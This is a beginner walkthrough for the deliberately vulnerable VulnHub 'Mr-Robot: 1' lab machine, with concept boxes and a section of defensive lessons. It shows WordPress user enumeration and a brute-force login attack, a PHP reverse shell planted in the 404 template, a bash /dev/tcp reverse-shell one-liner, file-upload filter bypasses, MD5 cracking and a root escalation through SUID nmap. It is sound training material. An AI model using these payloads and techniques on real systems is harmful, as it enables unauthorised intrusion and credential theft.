# Mr-Robot: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (e.g. VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | Mr-Robot: 1 |
| **Author** | Leon Johnson |
| **Released** | 28 Jun 2016 |
| **Difficulty** | Easy (beginner–intermediate) |
| **Attacker** | Kali Linux |
| **Target** | Linux (Ubuntu 14.04, WordPress on Apache) |
| **Keys/Flags** | 3 |
| **Example Target IP** | `192.168.56.101` |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/mr-robot-1,151/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/mr-robot-1,151/#download) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.100`. Substitute your own values.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`/`netdiscover`, `nmap -sn`).
- **Port & service enumeration** — full TCP scan with `nmap -sC -sV -p-`.
- **Web enumeration** — reading `robots.txt`, spotting an information leak.
- **WordPress enumeration** — using `wpscan` to find a valid username.
- **Credential attacks** — a targeted dictionary/brute-force attack against `wp-login.php`.
- **Foothold via a legitimate admin feature** — abusing the WordPress Theme Editor to run a PHP reverse shell.
- **Post-exploitation** — finding a password hash, cracking it with John the Ripper, and pivoting users with `su`.
- **Linux privilege escalation** — discovering a SUID `nmap` binary and abusing its interactive mode (via GTFOBins) to become root.

> **Why this matters:** every step here maps to a real-world attack technique. The box is a teaching tool, but the *patterns* — leaked wordlists, verbose login errors, editable server-side templates, misconfigured SUID binaries — appear in production systems constantly.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.100/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your network interfaces and their IP addresses. You need to know your subnet (here `192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts. Two common tools:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

```text
192.168.56.100   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.100   1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

Alternatively, an nmap ping sweep (no port scan) is quieter and works well:


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
```

> **Why it works:** The target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. `-sn` disables port scanning so the sweep is fast. `PCS Systemtechnik GmbH` / the `08:00:27` prefix is VirtualBox's default MAC vendor, a strong hint the host is a VM.

Target confirmed: **192.168.56.101**.

![Host discovery output](images/01-host-discovery.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

Now scan all TCP ports, run default scripts, and fingerprint service versions.

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00060s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu (protocol 2.0)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default set of Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** Three services stand out — SSH (22), HTTP (80), and HTTPS (443). The web server runs Apache and the certificate names `www.example.com`, so this is clearly a web-facing target. Web servers are where beginners usually find the first foothold.

Open the site in a browser at `http://192.168.56.101`. You are greeted by a Mr. Robot themed fake IRC terminal. It is a dead end, but it confirms a web app is running. Digging into directories eventually points at WordPress — but the fastest lead is the very first file any web enumerator should check: **robots.txt**.

```bash
curl http://192.168.56.101/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

> **What is `robots.txt`?** It is a plain-text file placed at the root of a website to tell search-engine crawlers which paths they are *not* supposed to index. It is a polite convention, **not a security control**. Because it is publicly readable, anything listed in it is effectively published to the world. Here the admin put two private filenames in it — a classic information leak.

> **Huge red flag:** `fsocity.dic` looks like a *dictionary/wordlist*, and `key-1-of-3.txt` is obviously a flag. A site leaking its own password wordlist is an attacker's dream — it removes all the guesswork from a brute-force attack.

Download the first key:

```bash
curl http://192.168.56.101/key-1-of-3.txt
```

```text
073403c8a58a1f80d943455fb30724b9
```

**Key 1: `073403c8a58a1f80d943455fb30724b9`**

Grab a copy of the leaked wordlist for later:

```bash
wget http://192.168.56.101/fsocity.dic
wc -l fsocity.dic
```

```text
 858160 fsocity.dic
```

![robots.txt and key 1](images/02-robots-txt.png)

---

## 3. Web enumeration & WordPress

The `readme.html` and login pages found during directory brute-forcing confirm **WordPress**. Enumerate users with `wpscan`.


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101 -e u
```

```text
[+] URL: http://192.168.56.101/ [192.168.56.101]
[+] WordPress version 4.3.6 identified
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] elliot
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress publishes author information (used by `/?author=1` URLs and REST endpoints), and `wpscan`'s `-e u` flag turns that into a user list. Result: a valid username, **`elliot`** — the show's protagonist, and the `fsocity.dic` wordlist almost certainly contains it too.

> **Bonus lead:** the `/license` page (found by `nikto`/`gobuster`) contains a base64 blob at the bottom. Decoding is a nice shortcut to the same credentials:
>
> ```bash
> echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
> ```

Now deduplicate the leaked wordlist — it contains only ~11k unique entries out of 858k lines — and brute-force `wp-login.php`.

```bash
sort -u fsocity.dic > fsocity-clean.dic
wc -l fsocity-clean.dic
```

```text
 11451 fsocity-clean.dic
```

```bash
wpscan --url http://192.168.56.101 \
  --password-attack wp-login \
  -U elliot \
  -P fsocity-clean.dic
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652
[+] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
```

> **Why it works:** WordPress returns *different error messages* for an invalid username versus an invalid password. That turns a login form into a username oracle. Once the username is known, a dictionary attack against the password field (using the server's own leaked wordlist!) recovers `elliot : ER28-0652`.

> **Real-world note:** this attack was only this fast because the target leaked a tailored wordlist. On a well-configured site, `wpscan` would need rate limiting, lockouts, and CAPTCHA to defeat — but the same enumeration principle applies.

![wpscan user enum and brute force](images/03-wpscan.png)

---

## 4. Foothold

Log in to the WordPress dashboard with the recovered credentials:

- URL: `http://192.168.56.101/wp-login.php`
- Username: `elliot`
- Password: `ER28-0652`

`elliot` has **Administrator** rights. Administrators can edit theme template files directly from the browser, which means we can make the server execute our PHP.

1. Get a copy of the well-known pentestmonkey reverse shell:


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

2. Open it and set your Kali IP and listening port near the top:

```php
$ip   = '192.168.56.100'; // CHANGE THIS
$port = 4444;             // CHANGE THIS
```

3. In the dashboard go to **Appearance → Theme Editor**, and select **`404.php`** (the "404 Template") from the active theme (Twenty Fifteen). Replace its entire contents with the reverse-shell code and click **Update File**.

> **Why it works:** the Theme Editor is a legitimate feature that lets admins edit PHP templates. A PHP template is executed server-side, so any code we put here runs on the target as the web-server user. Hiding it in `404.php` means our code fires whenever a page is *not found*.

4. Start a listener on Kali **before** triggering the shell:

```bash
nc -lvnp 4444
```

5. Trigger the shell by requesting a page that does not exist (which loads `404.php`):

```bash
curl "http://192.168.56.101/definitely-does-not-exist"
```

```text
connect to [192.168.56.100] from (UNKNOWN) [192.168.56.101] 40218
Linux linux 3.13.0-55-generic #94-Ubuntu SMP ... x86_64 GNU/Linux
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$
```

We have a shell as **`daemon`**. Upgrade it to a proper interactive TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** the raw netcat shell has no job control, no tab completion, and often cannot handle interactive prompts like `su`. Spawning a pseudo-terminal (`pty`) fixes all of that — you will need it for the `su` step below.

Now enumerate the home directory:

```bash
cd /home/robot
ls -la
```

```text
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We cannot read `key-2-of-3.txt` as `daemon`, but `password.raw-md5` is world-readable:

```bash
cat password.raw-md5
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack the MD5 hash with John the Ripper (it is a very weak, well-known password):


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
```

```text
c3fcd3d76192e4007dfb496cca67e13b (robot)
```

```text
abcdefghijklmnopqrstuvwxyz
```

> **Why it works:** MD5 is a fast, unsalted hashing algorithm. There is no key-stretching, so billions of guesses per second are possible, and `rockyou.txt` contains this password (the entire lowercase alphabet). Never store passwords with unsalted MD5.

Pivot to the `robot` user and read Key 2:

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

```text
822c73956184f694993bede3eb39f959
```

**Key 2: `822c73956184f694993bede3eb39f959`**

![Reverse shell and key 2](images/04-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation

We need root for the final key. The classic first move is to hunt for SUID binaries.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/bin/ping
/bin/umount
/bin/mount
/usr/local/bin/nmap
```

> **What is SUID?** The SUID bit (`-rwsr-xr-x`, note the `s`) makes a program run with the privileges of its **owner** instead of the user who launched it. Most listed binaries are owned by `root`. Normally that is intentional and safe (`passwd` needs root to change passwords). But `nmap` — a network scanner — has **no business** being SUID root. That is the misconfiguration.

Check the version and confirmed SUID owner:

```bash
ls -l /usr/local/bin/nmap
/usr/local/bin/nmap --version
```

```text
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
Nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

> **Why it works:** nmap **3.81** still supports `--interactive` mode, which drops into a mini-shell that can run commands on the OS — and because the binary is SUID root, those commands run as root. This exact technique is documented on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).

Exploit it:

```bash
nmap --interactive
```

```text
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
```

```bash
whoami
id
```

```text
root
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

> **Why it works:** `!sh` in nmap's interactive mode spawns a shell. Because nmap is SUID root, the shell inherits `euid=0` — effective root. We now have full control.

Read the final key:

```bash
cat /root/key-3-of-3.txt
```

```text
04787ddef27c3dee1ee161b21670b4e4
```

**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

![Root shell and key 3](images/05-privesc-root.png)

All three keys captured. Machine rooted.

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive file disclosure via `robots.txt` | `http://<IP>/robots.txt` | Leaks `fsocity.dic` (wordlist) and Key 1 |
| 2 | Username enumeration via verbose login errors | `wp-login.php` | Reveals valid user `elliot` |
| 3 | Weak / guessable admin credentials | WordPress admin | Full CMS admin access |
| 4 | Server-side code execution via Theme Editor | Appearance → Editor → `404.php` | Remote shell as `daemon` |
| 5 | Weak unsalted MD5 password storage | `/home/robot/password.raw-md5` | `robot` password cracked instantly |
| 6 | SUID root binary with shell escape | `/usr/local/bin/nmap` (v3.81) | Full root compromise |

---

## 7. Defensive lessons

- **Do not put sensitive paths in `robots.txt`.** It is public. Use authentication, not obscurity, to protect files.
- **Return generic login errors.** Never tell an attacker whether a username exists — "Invalid username or password" for every failure kills username enumeration.
- **Enforce strong admin credentials and rate limiting / lockouts / MFA** on `wp-login.php`, and disable XML-RPC if unused.
- **Restrict the WordPress theme/plugin editor** by setting `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`, and enforce the principle of least privilege for web users.
- **Store passwords with a slow, salted hash** (bcrypt, scrypt, Argon2) — never unsalted MD5/SHA1.
- **Audit SUID binaries.** `find / -perm -4000 -type f` regularly; remove the SUID bit from anything that does not strictly need it (nmap certainly does not).
- **Keep software patched** — old nmap, old WordPress, and old plugins all contributed here.
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.
